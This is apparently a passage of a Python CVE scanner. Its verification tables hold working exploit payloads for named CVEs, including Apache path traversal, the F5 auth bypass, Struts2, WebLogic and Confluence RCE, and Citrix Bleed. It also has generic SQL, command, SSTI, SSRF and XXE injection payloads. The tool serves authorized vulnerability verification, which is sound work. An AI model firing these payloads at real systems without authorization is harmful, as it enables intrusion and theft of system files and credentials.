#!/usr/bin/env python3
"""
cve_scanner.py — Free CVE scanner with CVE-specific + CWE-based PoC verification.

⚠️  AUTHORIZED USE ONLY
Active PoCs send real exploit payloads. Use only against systems you own
or have written permission to test. Unauthorized scanning is illegal.

Commands:
  deps    Scan requirements.txt / package.json via OSV
  dast    Run Nuclei against a URL (requires Nuclei installed)
  verify  Actively verify findings with CVE + CWE PoCs
  enrich  Look up a single CVE ID

Verification order per finding:
  1. CVE-specific probe (if CVE_PROBES has an entry)
  2. Nuclei per-CVE template
  3. CWE generic probe (if finding has a CWE)
  4. UNVERIFIED

Free data sources: OSV.dev, NVD 2.0, CISA KEV, EPSS.
Optional: Nuclei for OOB templates (Log4Shell, Spring4Shell, etc.).

Usage:
  python cve_scanner.py --list-cves
  python cve_scanner.py --list-payloads
  python cve_scanner.py deps requirements.txt -o findings.json
  python cve_scanner.py dast https://example.com -o dast.json
  python cve_scanner.py verify findings.json --target https://staging.example.com \\
      --header "Authorization: Bearer $TOKEN" -o verified.json --sarif verified.sarif
  python cve_scanner.py enrich CVE-2024-3400
"""
from __future__ import annotations

import argparse
import csv
import json
import logging
import os
import re
import signal
import subprocess
import sys
import tempfile
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, quote

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Please install requests: pip install requests", file=sys.stderr)
    sys.exit(1)

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

# ================================================================
# CONFIG
# ================================================================
__version__ = "7.0.0"

OSV_API  = "https://api.osv.dev/v1/query"
NVD_API  = "https://services.nvd.nist.gov/rest/json/cves/2.0"
KEV_URL  = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
EPSS_API = "https://api.first.org/data/v1/epss"

NVD_API_KEY    = os.getenv("NVD_API_KEY")
NVD_RATE_SLEEP = 6.0 if not NVD_API_KEY else 0.6
NVD_MAX_RETRIES = 3

CACHE_DIR = Path.home() / ".cache" / "cve_scanner"
CACHE_DIR.mkdir(parents=True, exist_ok=True)

log = logging.getLogger("cve_scanner")
_SHUTDOWN = threading.Event()


# ================================================================
# CWE FRIENDLY NAMES
# ================================================================
CWE_NAMES: Dict[str, str] = {
    "CWE-20":   "Input Validation",
    "CWE-22":   "Path Traversal",
    "CWE-78":   "Command Injection (OS)",
    "CWE-79":   "XSS",
    "CWE-89":   "SQL Injection",
    "CWE-90":   "LDAP Injection",
    "CWE-94":   "Code Injection / SSTI",
    "CWE-95":   "Eval Injection",
    "CWE-113":  "CRLF / Header Injection",
    "CWE-119":  "Buffer Overflow",
    "CWE-125":  "Out-of-bounds Read",
    "CWE-200":  "Information Disclosure",
    "CWE-287":  "Authentication Bypass",
    "CWE-295":  "Improper Certificate Validation",
    "CWE-306":  "Missing Auth for Critical Function",
    "CWE-319":  "Cleartext Transmission",
    "CWE-326":  "Inadequate Encryption Strength",
    "CWE-352":  "CSRF",
    "CWE-377":  "Insecure Temp File",
    "CWE-400":  "Uncontrolled Resource Consumption",
    "CWE-416":  "Use After Free",
    "CWE-434":  "Unrestricted File Upload",
    "CWE-476":  "NULL Pointer Dereference",
    "CWE-502":  "Insecure Deserialization",
    "CWE-601":  "Open Redirect",
    "CWE-611":  "XXE",
    "CWE-643":  "XPath Injection",
    "CWE-697":  "Incorrect Comparison",
    "CWE-732":  "Incorrect Permission Assignment",
    "CWE-787":  "Out-of-bounds Write",
    "CWE-798":  "Hardcoded Credentials",
    "CWE-862":  "Missing Authorization",
    "CWE-863":  "Incorrect Authorization",
    "CWE-918":  "SSRF",
    "CWE-943":  "NoSQL Injection",
    "CWE-1021": "Clickjacking",
    "CWE-1104": "Unmaintained Component",
    "CWE-1321": "Prototype Pollution",
    "CWE-1333": "ReDoS",
}


def cwe_friendly(cwe_id: str) -> str:
    return CWE_NAMES.get(cwe_id, cwe_id or "Unknown")


def cwe_list_friendly(cwes: List[str]) -> str:
    if not cwes:
        return "Unknown"
    return ", ".join(f"{cwe_friendly(c)} ({c})" for c in cwes)


# ================================================================
# CVE-SPECIFIC PROBES
# ================================================================
# Only in-band-detectable CVEs are listed here (no OOB / DNS callback).
# For OOB CVEs (Log4Shell, Spring4Shell, etc.) use Nuclei — it integrates
# with interactsh for callbacks.
#
# Schema per probe:
#   path           — URL path (joined to target)
#   method         — GET | POST (default GET)
#   headers        — extra headers (merged with session)
#   data           — POST body (form-encoded string or None)
#   json_body      — dict for JSON POST body (overrides data)
#   require_status — list of acceptable status codes for "positive" hint
#   sig            — dict of {label: regex} that must appear in exploit
#                    response but NOT in baseline
#   baseline_path  — path used for baseline (default "/")

CVE_PROBES: Dict[str, dict] = {
    # ─────────────── PATH TRAVERSAL ───────────────
    "CVE-2021-41773": {
        "label": "Apache HTTP Server 2.4.49 Path Traversal",
        "probes": [
            {
                "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            },
        ],
    },
    "CVE-2021-42013": {
        "label": "Apache HTTP Server 2.4.50 Path Traversal (bypass)",
        "probes": [
            {
                "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            },
            {
                "path": "/icons/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            },
        ],
    },
    "CVE-2019-19781": {
        "label": "Citrix ADC / Gateway Path Traversal",
        "probes": [
            {
                "path": "/vpn/../vpns/cfg/smb.conf",
                "sig": {"smb_conf": r"\[global\]"},
            },
            {
                "path": "/vpns/../vpns/cfg/smb.conf",
                "sig": {"smb_conf": r"\[global\]"},
            },
        ],
    },
    "CVE-2019-11510": {
        "label": "Pulse Secure Path Traversal",
        "probes": [
            {
                "path": "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            },
        ],
    },

    # ─────────────── AUTH BYPASS ───────────────
    "CVE-2022-1388": {
        "label": "F5 BIG-IP iControl REST Auth Bypass",
        "probes": [
            {
                "method": "POST",
                "path": "/mgmt/tm/util/bash",
                "headers": {
                    "X-F5-Auth-Token": "anything",
                    "Connection": "X-F5-Auth-Token",
                    "Content-Type": "application/json",
                },
                "json_body": {"command": "run", "utilCmdArgs": "-c id"},
                "require_status": [200],
                "sig": {"f5_bash": r"\"commandResult\"|\"kind\":\"tm:util:bash:runstate\""},
            },
        ],
    },
    "CVE-2020-14882": {
        "label": "Oracle WebLogic Console Auth Bypass",
        "probes": [
            {
                "path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread.currentThread().getContextClassLoader()')",
                "require_status": [200],
                "sig": {"weblogic_console": r"WebLogic|console\.portal|Oracle"},
            },
        ],
    },

    # ─────────────── RCE / OGNL / INJECTION ───────────────
    "CVE-2017-5638": {
        "label": "Apache Struts2 S2-045 RCE",
        "probes": [
            {
                "method": "GET",
                "path": "/",
                "headers": {
                    "Content-Type": (
                        "%{(#_='multipart/form-data')."
                        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                        "(#_memberAccess?(#_memberAccess=#dm):"
                        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                        "(#ognlUtil.getExcludedPackageNames().clear())."
                        "(#ognlUtil.getExcludedClasses().clear())."
                        "(#context.setMemberAccess(#dm))))."
                        "(#cmd='id')."
                        "(#cmds={'/bin/bash','-c',#cmd})."
                        "(#p=new java.lang.ProcessBuilder(#cmds))."
                        "(#p.redirectErrorStream(true))."
                        "(#process=#p.start())."
                        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                        "(#ros.flush())}"
                    ),
                },
                "sig": {"uid_gid": r"uid=\d+\([^)]*\)"},
            },
        ],
    },
    "CVE-2017-9805": {
        "label": "Apache Struts2 S2-052 REST RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/orders/3/edit",
                "headers": {"Content-Type": "application/xml"},
                "data": (
                    '<map><entry>'
                    '<jdk.nashorn.internal.objects.NativeString>'
                    '<flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">'
                    '<dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">'
                    '<is class="javax.crypto.CipherInputStream">'
                    '<cipher class="javax.crypto.NullCipher"><initialized>false</initialized></cipher>'
                    '<input class="java.io.ByteArrayInputStream"><buf>[base64]</buf></input>'
                    '</is><contentType>text/plain</contentType></dataSource></dataHandler>'
                    '</value></jdk.nashorn.internal.objects.NativeString></entry></map>'
                ),
                "sig": {"struts2_error": r"Struts|OGNL|ClassCastException"},
            },
        ],
    },
    "CVE-2022-26134": {
        "label": "Atlassian Confluence OGNL Injection (post-auth)",
        "probes": [
            {
                "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D%2F.%2F",
                "sig": {"confluence": r"Confluence|OGNL|X-CVE-PROBE"},
            },
        ],
    },
    "CVE-2021-26084": {
        "label": "Atlassian Confluence Pre-Auth OGNL",
        "probes": [
            {
                "method": "POST",
                "path": "/pages/doenterpagevariables.action",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "queryString=%5Cu0027%2B%7BClass.forName%28%5Cu0027java.lang.Runtime%5Cu0027%29.getMethod%28%5Cu0027getRuntime%5Cu0027%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0027id%5Cu0027%29%7D",
                "sig": {"confluence_error": r"Confluence|OGNL|XPathException"},
            },
        ],
    },

    # ─────────────── EXCHANGE ───────────────
    "CVE-2021-26855": {
        "label": "Exchange ProxyLogon SSRF",
        "probes": [
            {
                "path": "/ecp/x.jsx",
                "headers": {
                    "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt",
                },
                "sig": {"proxylogon": r"Negotiate|X-BEResource|X-CalculatedBETarget"},
            },
        ],
    },
    "CVE-2021-34473": {
        "label": "Exchange ProxyShell RCE",
        "probes": [
            {
                "path": "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com&Protocol=XYZ&Mailbox=autodiscover/autodiscover.json%3F@test.com",
                "sig": {"proxyshell": r"X-FEServer|X-BackEndCookie|autodiscover"},
            },
        ],
    },

    # ─────────────── VMWARE vCENTER ───────────────
    "CVE-2021-21972": {
        "label": "VMware vCenter Server vROPs RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/ui/vropspluginui/rest/services/uploadova",
                "headers": {"Content-Type": "application/octet-stream"},
                "data": "BOUNDARY",
                "sig": {"vrops": r"vropspluginui|uploadova|vROPs"},
            },
        ],
    },
    "CVE-2021-21985": {
        "label": "VMware vCenter vSAN Plugin RCE",
        "probes": [
            {
                "path": "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVrUsageDisabled/setTarget/",
                "sig": {"vsan": r"vsanProviderUtils|h5-vsan"},
            },
        ],
    },

    # ─────────────── FIREWALL / VPN APPLIANCES ───────────────
    "CVE-2024-3400": {
        "label": "PAN-OS GlobalProtect Command Injection",
        "probes": [
            {
                "path": "/global-protect/login.esp",
                "headers": {
                    "Cookie": (
                        "SESSID=/../../../var/appweb/sslvpndocs/"
                        "global-protect/portal/images/cve-2024-3400.txt"
                    ),
                },
                "sig": {"pan_os": r"GlobalProtect|PanOS|Palo Alto"},
            },
        ],
    },

    # ─────────────── WEBLOGIC / SHIRO DESERIALIZATION ───────────────
    "CVE-2019-2725": {
        "label": "WebLogic wls-wsat Deserialization",
        "probes": [
            {
                "method": "POST",
                "path": "/wls-wsat/CoordinatorPortType",
                "headers": {"Content-Type": "text/xml"},
                "data": (
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">'
                    '<java version="1.8" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder">'
                    '<array class="java.lang.String" length="1"><void index="0"><string>/bin/id</string></void>'
                    '</array><void method="start"/></void></java></work:WorkContext></soapenv:Header>'
                    '<soapenv:Body/></soapenv:Envelope>'
                ),
                "sig": {"weblogic_wls": r"wls-wsat|WebLogic|X-CVE-PROBE"},
            },
        ],
    },
    "CVE-2016-4437": {
        "label": "Apache Shiro rememberMe Deserialization",
        "probes": [
            {
                "path": "/",
                "headers": {
                    "Cookie": (
                        "rememberMe=rO0ABXNyAA1qYXZhLnV0aWwuTWFwASJV+1PjCyYCAAB4cHcIAAAAATAAc3IADmphdmEubGFuZy5Mb25n7Xpr+KiN7SgCAAB4cgAQamF2YS5sYW5nLk51bWJlcoVr66C8Z6HqAgABTAAKdmFsdWVMb25ndAAPTGphdmEvbGFuZy9Mb25nO3hwdAAIAAAAAAAAAAE="
                    ),
                },
                "sig": {"shiro": r"rememberMe|Shiro|deleteMe|X-CVE-PROBE"},
            },
        ],
    },

    # ─────────────── CITRIX BLEED ───────────────
    "CVE-2023-4966": {
        "label": "Citrix Bleed (Session Token Leak)",
        "probes": [
            {
                "path": "/oauth/idp/.well-known/openid-configuration",
                "headers": {"Host": "a" * 24576 + ".example.com"},
                "require_status": [200],
                "sig": {
                    "citrix_leak": r"ctx\.session|citrix_session|NSC_[A-Za-z0-9]{20,}|ctxt[0-9]{8,}",
                },
            },
        ],
    },
}


# ================================================================
# CWE PROBES (generic, form-based)
# ================================================================
SQL_ERROR_SIGNATURES: List[Tuple[str, str]] = [
    (r"SQL syntax.*MySQL", "mysql"),
    (r"Warning.*mysql_", "mysql"),
    (r"MySqlException", "mysql"),
    (r"valid MySQL result", "mysql"),
    (r"mysql_fetch_(array|assoc|row|object)\(\)", "mysql"),
    (r"mysql_num_rows\(\)", "mysql"),
    (r"mysql_query\(\)", "mysql"),
    (r"com\.mysql\.jdbc", "mysql"),
    (r"MariaDB server version", "mysql"),
    (r"MySqlClient\.", "mysql"),
    (r"check the manual that corresponds to your (MySQL|MariaDB) server version", "mysql"),
    (r"Table '[^']+' doesn't exist", "mysql"),
    (r"You have an error in your SQL syntax", "mysql"),
    (r"PostgreSQL.*ERROR", "postgresql"),
    (r"pg_query\(\)", "postgresql"),
    (r"pg_exec\(\)", "postgresql"),
    (r"PSQLException", "postgresql"),
    (r"unterminated quoted string at or near", "postgresql"),
    (r"pg_catalog", "postgresql"),
    (r"current_schema\(\)", "postgresql"),
    (r"syntax error at or near", "postgresql"),
    (r"column .* does not exist", "postgresql"),
    (r"relation .* does not exist", "postgresql"),
    (r"invalid input syntax for type", "postgresql"),
    (r"ORA-\d{5}", "oracle"),
    (r"Oracle.*Driver", "oracle"),
    (r"quoted string not properly ended", "oracle"),
    (r"oracle\.jdbc", "oracle"),
    (r"ORA-00933", "oracle"),
    (r"ORA-00936", "oracle"),
    (r"ORA-01756", "oracle"),
    (r"Microsoft.*ODBC.*SQL Server", "mssql"),
    (r"SQLServer JDBC Driver", "mssql"),
    (r"SqlException", "mssql"),
    (r"System\.Data\.SqlClient", "mssql"),
    (r"\.Net SqlClient Data Provider", "mssql"),
    (r"Msg \d+, Level \d+, State \d+", "mssql"),
    (r"Incorrect syntax near", "mssql"),
    (r"Unclosed quotation mark after the character string", "mssql"),
    (r"Conversion failed when converting", "mssql"),
    (r"SQLite/JDBCDriver", "sqlite"),
    (r"SQLite\.Exception", "sqlite"),
    (r"System\.Data\.SQLite\.SQLiteException", "sqlite"),
    (r"\[SQLITE_ERROR\]", "sqlite"),
    (r"SQLite3::SQLException", "sqlite"),
    (r"near .*: syntax error", "sqlite"),
    (r"SQL command not properly ended", "generic"),
    (r"ODBC SQL Server Driver", "generic"),
    (r"JDBC SQL Server Driver", "generic"),
]

XSS_SIGNATURES: Dict[str, str] = {
    "raw_script": r"(?i)<script[^>]*>.*?</script>",
    "script_src": r"(?i)<script[^>]+src\s*=\s*[\"']?[^\"'>]+",
    "svg_onload": r"(?i)<svg[^>]+onload\s*=",
    "img_onerror": r"(?i)<img[^>]+onerror\s*=",
    "body_onload": r"(?i)<body[^>]+onload\s*=",
    "input_onfocus": r"(?i)<input[^>]+onfocus\s*=",
    "details_ontoggle": r"(?i)<details[^>]+ontoggle\s*=",
    "video_onerror": r"(?i)<video[^>]+onerror\s*=",
    "audio_onerror": r"(?i)<audio[^>]+onerror\s*=",
    "javascript_uri": r"(?i)javascript\s*:\s*[^\s\"']",
    "data_uri_script": r"(?i)data\s*:\s*text/html[^,]*,",
    "dom_innerhtml": r"(?i)\.innerHTML\s*=",
    "dom_outerhtml": r"(?i)\.outerHTML\s*=",
    "dom_document_write": r"(?i)document\.write\s*\(",
    "dom_eval": r"(?i)\beval\s*\(",
    "dom_settimeout": r"(?i)setTimeout\s*\(\s*[\"']",
    "dom_function": r"(?i)new\s+Function\s*\(",
    "angular_bypass": r"(?i)\$sce\.trustAsHtml",
    "react_dangerously": r"(?i)dangerouslySetInnerHTML",
    "html_entity_script": r"(?i)&lt;script",
    "double_encoded": r"(?i)%253Cscript",
    "unicode_escape": r"(?i)\\u003cscript",
    "xss_marker": r"XSSMARK\d*",
}

LFI_SIGNATURES: Dict[str, str] = {
    "passwd_file": r"root:[x*]?:0:0:",
    "shadow_file": r"root:[*!]?:[0-9]+:[0-9]+:",
    "etc_hosts": r"127\.0\.0\.1\s+localhost",
    "etc_group": r"root:x:0:",
    "proc_self_environ": r"PATH=/",
    "proc_version": r"Linux version \d+\.\d+",
    "proc_cmdline": r"BOOT_IMAGE=",
    "ssh_key": r"-----BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY-----",
    "boot_ini": r"\[boot loader\]",
    "win_ini": r"\[fonts\]",
    "win_system_ini": r"\[386Enh\]",
    "win_win_ini": r"\[windows\]",
    "win_sam": r"SAM\\Domains\\Account",
    "php_filter_chain": r"php://filter",
    "php_input": r"php://input",
    "php_data": r"data://text/plain",
    "php_expect": r"expect://",
    "php_zip": r"zip://",
    "php_phar": r"phar://",
    "apache_access_log": r"\d+\.\d+\.\d+\.\d+ - - \[",
    "nginx_access_log": r"\d+\.\d+\.\d+\.\d+ - - \[",
}

RCE_SIGNATURES: Dict[str, str] = {
    "uid_gid": r"uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)",
    "www_data": r"www-data:",
    "root_shell": r"root@[a-zA-Z0-9_-]+:",
    "bin_bash": r"/bin/(ba)?sh",
    "nobody_user": r"nobody:",
    "nt_authority": r"NT AUTHORITY\\",
    "administrator": r"Administrator:",
    "volume_serial": r"Volume Serial Number is",
    "windows_dir": r"Directory of C:\\Windows",
    "windows_ipconfig": r"Windows IP Configuration",
    "sh_not_found": r"/bin/sh: .*: not found",
    "cmd_not_found": r"'[^']+' is not recognized as an internal or external command",
    "powershell_error": r"At line:\d+ char:\d+",
}

SSTI_SIGNATURES: Dict[str, str] = {
    "jinja_error": r"jinja2\.exceptions\.",
    "twig_error": r"Twig\\Error\\",
    "freemarker_error": r"freemarker\.core\.ParseException",
    "mako_error": r"mako\.exceptions\.",
    "velocity_error": r"org\.apache\.velocity",
    "handlebars_error": r"Handlebars\.Exception",
    "smarty_error": r"Smarty error",
    "erubis_error": r"Erubis::",
    "evaluated_49": r"(?<![\d])49(?![\d])",
    "evaluated_7777777": r"7777777",
    "evaluated_79005424": r"(?<![\d])79005424(?![\d])",
    "evaluated_343": r"(?<![\d])343(?![\d])",
    "literal_expression": r"\{\{[^}]+\}\}",
    "literal_dollar": r"\$\{[^}]+\}",
    "literal_erb": r"<%= [^%]+ %>",
}

SSRF_SIGNATURES: Dict[str, str] = {
    "aws_imds": r"ami-id|instance-id|iam/security-credentials",
    "aws_metadata": r"latest/meta-data",
    "gcp_metadata": r"metadata\.google\.internal",
    "gcp_project": r"project-id",
    "azure_metadata": r"169\.254\.169\.254",
    "azure_imds": r"metadata/instance",
    "alibaba_metadata": r"100\.100\.100\.200",
    "redis_info": r"redis_version:",
    "mysql_banner": r"\d+\.\d+\.\d+.*MySQL",
    "postgres_banner": r"PostgreSQL \d+\.\d+",
    "elasticsearch": r"\"cluster_name\"\s*:",
    "docker_api": r"\"ApiVersion\"\s*:",
    "kubernetes_api": r"\"kind\":\s*\"Pod\"",
    "consul_api": r"\"consul\"",
    "connection_refused": r"Connection refused",
    "timeout_internal": r"timed out",
    "gopher_dict": r"(gopher|dict)://",
    "file_protocol": r"file:///",
}

XXE_SIGNATURES: Dict[str, str] = {
    "passwd_leak": r"root:[x*]?:0:0:",
    "win_ini_leak": r"\[fonts\]",
    "ssh_key_leak": r"-----BEGIN (RSA|OPENSSH) PRIVATE KEY-----",
    "libxml_error": r"libxml2",
    "expat_error": r"expat",
    "java_sax_error": r"SAXParseException",
    "dotnet_xml_error": r"System\.Xml\.",
    "python_xml_error": r"xml\.etree\.ElementTree",
    "entity_expansion": r"&[a-zA-Z0-9_]+;",
    "doctype_entity": r"<!ENTITY",
    "external_dtd": r"<!DOCTYPE[^>]+SYSTEM",
    "parameter_entity": r"%[a-zA-Z0-9_]+;",
}

DESERIALIZATION_SIGNATURES: Dict[str, str] = {
    "java_magic_bytes": r"rO0AB",
    "java_stream_error": r"java\.io\.ObjectInputStream",
    "java_class_cast": r"java\.lang\.ClassCastException",
    "java_ysoserial": r"ysoserial",
    "php_serialized": r"O:\d+:\"[^\"]+\":\d+:\{",
    "php_unserialize_error": r"unserialize\(\): Error at offset",
    "php_pop_chain": r"__wakeup|__destruct|__toString",
    "pickle_magic": r"\x80\x03|\x80\x04|\x80\x05",
    "pickle_error": r"_pickle\.UnpicklingError",
    "yaml_load": r"yaml\.load\(",
    "dotnet_viewstate": r"/wEP",
    "binaryformatter_error": r"System\.Runtime\.Serialization\.BinaryFormatter",
    "dotnet_typeconfuse": r"TypeConfuseDelegate",
    "ruby_marshal": r"\x04\x08",
    "yaml_psych": r"Psych::SyntaxError|YAML\.load",
}

OPEN_REDIRECT_SIGNATURES: Dict[str, str] = {
    "evil_host": r"(?m)^Location\s*:\s*https?://[^/\s]*evil",
    "protocol_relative": r"(?m)^Location\s*:\s*//evil",
    "backslash_bypass": r"(?m)^Location\s*:\s*https?://[^/\s]*\\",
    "at_bypass": r"(?m)^Location\s*:\s*https?://[^@\s]*@evil",
    "meta_refresh": r"(?i)<meta[^>]+http-equiv=[\"']?refresh[^>]+url=[\"']?https?://evil",
    "js_location": r"(?i)(location\.href|window\.location)\s*=\s*[\"']https?://evil",
    "js_replace": r"(?i)location\.replace\s*\(\s*[\"']https?://evil",
}

NOSQL_SIGNATURES: Dict[str, str] = {
    "mongo_error": r"MongoError|MongoServerError|mongoengine",
    "mongo_operator": r"\$ne|\$gt|\$where|\$regex",
    "mongo_stack": r"pymongo\.errors",
    "couchdb_error": r"couchdb|CouchDB",
    "redis_error": r"redis\.exceptions|RedisError",
}

LDAP_SIGNATURES: Dict[str, str] = {
    "ldap_error": r"LDAPException|ldap_search|Invalid DN syntax",
    "ldap_filter": r"\(\s*[|&]\s*\(",
    "java_ldap": r"javax\.naming\.directory",
    "python_ldap": r"ldap\.LDAPError",
}

XPATH_SIGNATURES: Dict[str, str] = {
    "xpath_error": r"XPathException|XPath syntax error",
    "libxml_xpath": r"xmlXPathEval",
    "java_xpath": r"javax\.xml\.xpath",
}

CRLF_SIGNATURES: Dict[str, str] = {
    "injected_header": r"(?m)^X-Injected:\s*",
    "set_cookie_inject": r"(?m)^Set-Cookie:\s*.*\r?\n",
    "response_split": r"\r\n\r\nHTTP/1\.[01] \d{3}",
}

WAF_FINGERPRINTS: Dict[str, dict] = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "server:cloudflare"],
        "body": ["attention required! | cloudflare", "/cdn-cgi/challenge-platform/",
                 "ray id:", "cloudflare to restrict access"],
        "cookies": ["__cf_bm", "cf_clearance"],
        "status": [403, 503],
    },
    "akamai": {
        "headers": ["server:akamaighost", "akamai-bot-manager"],
        "body": ["access denied | akamai", "reference #"],
        "cookies": ["ak_bmsc", "bm_sv"],
        "status": [403],
    },
    "imperva_incapsula": {
        "headers": ["x-iinfo"],
        "body": ["incapsula incident id", "powered by incapsula", "_Incapsula_Resource"],
        "cookies": ["incap_ses", "visid_incap"],
        "status": [403],
    },
    "f5_big_ip_asm": {
        "headers": ["x-wa-info", "x-cnection"],
        "body": ["the requested url was rejected", "support id:"],
        "cookies": ["TS01", "BIGipServer"],
        "status": [403],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "body": ["request blocked by aws waf"],
        "cookies": [],
        "status": [403],
    },
    "fortiweb": {
        "headers": ["server:fortiweb"],
        "body": ["fortiweb"],
        "cookies": [],
        "status": [403],
    },
    "barracuda": {
        "headers": ["barra_counter_session"],
        "body": ["barracuda"],
        "cookies": ["barra_counter_session"],
        "status": [403],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body": ["sucuri website firewall", "access denied - sucuri"],
        "cookies": [],
        "status": [403],
    },
    "modsecurity": {
        "headers": ["server:modsecurity"],
        "body": ["mod_security", "not acceptable"],
        "cookies": [],
        "status": [403, 406],
    },
}

CWE_PROBES: Dict[str, dict] = {
    "CWE-79": {
        "label": "XSS (reflected)",
        "payloads": [
            '<svg/onload=alert("XSSMARK1")>',
            '"><script>alert("XSSMARK2")</script>',
            "'><img src=x onerror=alert('XSSMARK3')>",
            '<details open ontoggle=alert("XSSMARK4")>',
        ],
        "detect": "xss_reflection",
        "markers": ["XSSMARK1", "XSSMARK2", "XSSMARK3", "XSSMARK4"],
    },
    "CWE-89": {
        "label": "SQL Injection",
        "payloads": [
            "'; SELECT pg_sleep(4);-- -",
            "' OR SLEEP(4)-- -",
            "' AND SLEEP(4)-- -",
            "'; WAITFOR DELAY '0:0:4'-- -",
            "'",
            '"',
        ],
        "detect": "sql",
        "timing_threshold": 3.0,
    },
    "CWE-22": {
        "label": "Path Traversal",
        "payloads": [
            "../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
        ],
        "detect": "pattern",
        "signatures": LFI_SIGNATURES,
    },
    "CWE-78": {
        "label": "Command Injection",
        "payloads": [
            ";sleep 4;", "|id", "|sleep 4",
            "$(sleep 4)", "`id`", "& ping -c 4 127.0.0.1 &",
        ],
        "detect": "rce",
        "timing_threshold": 3.0,
    },
    "CWE-94": {
        "label": "SSTI",
        "payloads": [
            "{{8888*8888}}", "${8888*8888}",
            "<%= 8888*8888 %>", "#{8888*8888}",
            "{{7*7}}", "{{7*'7'}}",
        ],
        "detect": "ssti",
        "expected": "79005424",
    },
    "CWE-918": {
        "label": "SSRF",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "file:///etc/passwd",
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        "detect": "pattern",
        "signatures": SSRF_SIGNATURES,
    },
    "CWE-611": {
        "label": "XXE",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ],
        "detect": "pattern",
        "signatures": XXE_SIGNATURES,
    },
    "CWE-502": {
        "label": "Insecure Deserialization",
        "payloads": [
            'O:8:"stdClass":1:{s:4:"test";s:4:"pwn3";}',
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAA2Zvb3QAAA==',
        ],
        "detect": "pattern",
        "signatures": DESERIALIZATION_SIGNATURES,
    },
    "CWE-601": {
        "label": "Open Redirect",
        "payloads": [
            "https://evil.example.com/",
            "//evil.example.com/",
            "/\\evil.example.com/",
            "https://legit.com@evil.example.com/",
        ],
        "detect": "redirect",
        "expected": "evil.example.com",
    },
    "CWE-943": {
        "label": "NoSQL Injection",
        "payloads": [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            "' || '1'=='1",
            '{"$where": "sleep(4000)"}',
        ],
        "detect": "pattern",
        "signatures": NOSQL_SIGNATURES,
    },
    "CWE-90": {
        "label": "LDAP Injection",
        "payloads": [
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
        ],
        "detect": "pattern",
        "signatures": LDAP_SIGNATURES,
    },
    "CWE-643": {
        "label": "XPath Injection",
        "payloads": [
            "' or '1'='1",
            "x' or name()='username' or 'x'='y",
